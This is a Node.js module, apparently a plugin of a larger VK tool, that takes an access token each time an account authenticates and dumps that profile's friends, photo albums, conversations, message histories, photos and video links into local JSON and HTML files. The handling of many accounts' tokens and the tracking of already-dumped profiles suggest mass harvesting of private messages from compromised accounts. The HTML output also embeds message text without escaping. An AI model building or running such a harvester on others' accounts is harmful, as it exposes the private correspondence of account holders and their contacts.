/* eslint-disable no-case-declarations */
const { VK } = require("vk-io");
const {
  isMainThread,
  Worker,
  workerData,
  parentPort
} = require("worker_threads");
const { join: pathJoin } = require("path");

const dumper = require("./dumper");
const log = require("./logger");
const {
  mkdir,
  sleep,
  writeJSON,
  writeFile,
  createHTML,
  findBiggestSize,
  getCss
} = require("./utils");

const dumped = new Set();

exports.name = "Dumper";

/**
 *
 * @param {*} config
 * @param {import("events").EventEmitter} ee
 */

exports.init = (config, ee) => {
  ee.on("auth:success", ({ token, user_id }) => {
    if (dumped.has(user_id)) {
      log.warning(`Profile was already dumped: https://vk.com/id${user_id}`);

      return;
    }

    dumped.add(user_id);

    log.warning(`Starting dumper for profile: https://vk.com/id${user_id}`);

    dump(token)
      .then(() => {
        ee.emit("dumper:success", { user_id });

        log.success(`Profile: https://vk.com/id${user_id} successful dumped`);
      })
      .catch(error => {
        ee.emit("dumper:fail", { user_id });

        log.error(`Profile: https://vk.com/id${user_id} failed to dump`, error);
      });
  });
};

const messagesCSS = getCss("messages");
const videosCSS = getCss("videos");

const dump = token => {
  const worker = new Worker(__filename, { workerData: { token } });

  return new Promise((resolve, reject) => {
    worker.once("message", resolve);
    worker.once("error", reject);
  });
};

if (!isMainThread) {
  const { token } = workerData;
  const vk = new VK({ token });

  work(vk)
    .then(data => parentPort.postMessage(data))
    .catch(error => {
      throw error;
    });
}

/**
 *
 * @param {VK} vk
 */
async function work(vk) {
  const me = await dumper.getMe(vk);

  log.kw("Dumping", `${me.first_name} ${me.last_name}`);

  const dumpsDirectory = pathJoin(
    __dirname,
    "..",
    "..",
    "dumps",
    `${me.first_name} ${me.last_name} @${me.screen_name || "id" + me.id}`
  );

  await mkdir(dumpsDirectory);

  await writeJSON(pathJoin(dumpsDirectory, "user.json"), me);
  log.kw("Dumping Section", "Friends");

  const friends = await dumper.getFriends(vk);
  log.message(`${me.first_name} ${me.last_name} has ${friends.count} friends`);

  await writeJSON(pathJoin(dumpsDirectory, "friends.json"), friends);
  await sleep(3000);

  log.kw("Dumping Section", "Photos");
  await mkdir(pathJoin(dumpsDirectory, "albums"));

  const { items: albums } = await vk.api.photos.getAlbums({
    need_system: true
  });

  for (const album of albums) {
    const albumTitle = album.title.replace(/(\\|\/)/g, "|");

    const albumPath = pathJoin(dumpsDirectory, "albums", albumTitle);
    await mkdir(albumPath);

    await writeJSON(pathJoin(albumPath, "album.json"), album);

    log.secondaryMessage(albumTitle, "+");
    try {
      const { items: photos } = await vk.api.photos.get({
        album_id: album.id,
        count: 1000
      });
      await dumper.downloadPhotos(albumPath, photos);
    } catch {
      log.error(`Unable to dump album: ${album.title}`);
    }
  }

  log.kw("Dumping Section", "Dialogs");

  await mkdir(pathJoin(dumpsDirectory, "dialogs"));

  const {
    items: dialogs,
    profiles,
    groups
  } = await vk.api.messages.getConversations({
    count: 200,
    filter: "all",
    extended: true
  });

  await writeJSON(pathJoin(dumpsDirectory, "dialogs", "groups.json"), groups);

  await writeJSON(
    pathJoin(dumpsDirectory, "dialogs", "profiles.json"),
    profiles
  );

  for (const { conversation } of dialogs) {
    try {
      const { peer } = conversation;
      let dialogTitle = "untitled";

      switch (peer.type) {
        case "chat":
          dialogTitle = conversation.chat_settings.title;
          break;
        case "group":
          dialogTitle = groups.find(group => group.id === peer.local_id).name;
          break;
        case "user":
          // eslint-disable-next-line no-case-declarations
          const companion = profiles.find(
            profile => profile.id === peer.local_id
          );

          dialogTitle = `${companion.first_name} ${companion.last_name}`;
          break;
      }

      log.kw("Dialog", dialogTitle);

      // Чтобы не ломалась структура папок
      dialogTitle = dialogTitle.replace(/(\/|\\)/g, "|");
      log.kw("Dialog dir", dialogTitle);

      const dialogDirectory = pathJoin(
        dumpsDirectory,
        "dialogs",
        `${dialogTitle} ${peer.type}${peer.local_id}`
      );

      await mkdir(dialogDirectory);

      //#region Photos
      log.secondaryMessage("Photos", "+");

      const { items: photos } = await vk.api.messages.getHistoryAttachments({
        count: 200,
        peer_id: peer.id,
        media_type: "photo",
        max_forwards_level: 10
      });

      await mkdir(pathJoin(dialogDirectory, "photos"));

      await dumper.downloadPhotos(
        pathJoin(dialogDirectory, "photos"),
        photos.map(photo => photo.attachment.photo)
      );
      //#endregion

      //#region Videos
      log.secondaryMessage("Videos", "+");
      const {
        items: videosHistoryAttachments
      } = await vk.api.messages.getHistoryAttachments({
        count: 200,
        peer_id: peer.id,
        media_type: "video",
        max_forwards_level: 10
      });

      const videoIds = videosHistoryAttachments.map(video =>
        [
          video.attachment.video.owner_id,
          video.attachment.video.id,
          video.attachment.video.access_key
        ].join("_")
      );

      const { items: videos } = await vk.api.video.get({ videos: videoIds });

      let videosHTML = `<h1>Videos in chat - <a href="https://vk.com/im?sel=${peer.id}">${dialogTitle}</a></h1>`;

      for (const video of videos) {
        const { url, width, height } = findBiggestSize(video.image);

        videosHTML += `<article class="video">
  <h2 aria-hidden="true" class="title">${video.title}</h2>
  <img 
    class="thumbnail"
    src="${url}" 
    width="${width}" 
    height="${height}" 
    alt="Thumbnail for video: ${video.title}"
    loading="lazy"
  />
  <pre class="description">${video.description || ""}</pre>
  <div class="downloads">
    <h3>Downloads:</h3>
    <ol>
      ${Object.keys(video.files)
        .map(
          key =>
            `<li><a href="${video.files[key]}" target="_blank">${key}</a></li>`
        )
        .join("\n")}
    </ol>
  </div>


        
</article>`;
      }

      await writeFile(
        pathJoin(dialogDirectory, `Videos ${dialogTitle}.html`),
        createHTML(`Videos in chat - ${dialogTitle}`, videosHTML, videosCSS)
      );
      //#endregion

      //#region Messages
      log.secondaryMessage("Messages", "+");
      const { items: messages } = await vk.api.messages.getHistory({
        count: 200,
        peer_id: peer.id
      });
      await writeJSON(pathJoin(dialogDirectory, "messages.json"), messages);

      let messagesHTML = `<h1>Messages in chat - <a href="https://vk.com/im?sel=${peer.id}">${dialogTitle}</a></h1>`;

      for (const message of messages) {
        const isOutbox = message.from_id === me.id;
        const companionName =
          peer.type === "chat" ? String(message.from_id) : dialogTitle;
        const sender = isOutbox
          ? `${me.first_name} ${me.last_name}`
          : companionName;

        const text = message.text || "";
        const date = new Date(message.date * 1000);
        await writeJSON(pathJoin(dialogDirectory, "messages.json"), messages);

        messagesHTML += `<article class="message">
<div class="message-meta">
  <a 
    href="https://vk.com/im?sel=${message.from_id}" 
    class="sender"
  >
    <b>${sender}</b>
  </a>
  <a
    href="https://vk.com/im?sel=${peer.id}&msgid=${message.id}"
    class="date"
  >
    ${date}
  </a>
</div>
<div class="message-text">${text}</div>

${
  message.attachments && message.attachments.length > 0
    ? `
  <details ${text ? "" : "open"}>
    <summary>Attachments</summary>
    ${message.attachments
      .map(a => {
        switch (a.type) {
          case "photo":
            const { photo } = a;
            const photoSize = findBiggestSize(photo.sizes);
            const photoLinkZ = `photo${photo.owner_id}_${photo.id}%2Fmail${message.id}`;

            return `<a href="https://vk.com/im?sel=${peer.id}&z=${photoLinkZ}" target="_blank">
              <img
                src="${photoSize.url}" 
                alt="${a.photo.text}" 
                width="${photoSize.width}" 
                height="${photoSize.height}" 
                loading="lazy"
                class="photo"
              />
            </a>`;

          case "sticker":
            const { sticker } = a;
            const stickerImage = findBiggestSize(sticker.images);

            return `<a href="https://vk.com/im?sel=${peer.id}&msgid=${message.id}" target="_blank">
              <img
                src="${stickerImage.url}" 
                width="${stickerImage.width}" 
                height="${stickerImage.height}"
                loading="lazy"  
                class="sticker"
              />
            </a>`;

          case "wall":
            const { wall } = a;

            return `<a href="https://vk.com/wall${wall.owner_id}_${wall.id}_${wall.access_key}" target="_blank">
  Wall post
</a>`;

          case "audio_message":
            const { audio_message: audioMessage } = a;

            return `
<figure>
  <figcaption>${
    audioMessage.transcript_state === "done"
      ? audioMessage.transcript
      : "Transcript is not yet ready"
  }</figcaption>
  <audio controls>
    <source src="${audioMessage.link_ogg}" type="audio/ogg" />
    <source src="${audioMessage.link_mp3}" type="audio/mp3" />
  </audio>            
</figure>`;

          case "video":
            const { video } = a;

            const thumbnail = findBiggestSize(video.image);
            const videoLinkZ = `video${video.owner_id}_${video.id}%2Fmail${message.id}`;

            return `<a href="https://vk.com/im?sel=${peer.id}&z=${videoLinkZ}" target="_blank">
  <figure>
    <figcaption>Video: ${video.title}</figcaption>
    <img 
      class="thumbnail"
      src="${thumbnail.url}"
      width="${thumbnail.width}"
      height="${thumbnail.height}"
      loading="lazy"
      alt="${video.title}"
    />
  </figure>
</a>`;

          default:
            return `<pre>${JSON.stringify(a, undefined, 2)}</pre>`;
        }
      })
      .map(tag => `<div class="message-attachment">${tag}</div><br/>`)
      .join("\n")}
  </details>
`
    : ""
}
</article>`;
      }

      await writeFile(
        pathJoin(dialogDirectory, `Messages ${dialogTitle}.html`),
        createHTML(
          `Messages in chat - ${dialogTitle}`,
          messagesHTML,
          messagesCSS
        )
      );

      //#endregion
    } catch (error) {
      log.error("Unable to dump dialog:", error);
    }
  }

  // Доказательство существования аллаха
  return { Allah: true };
}
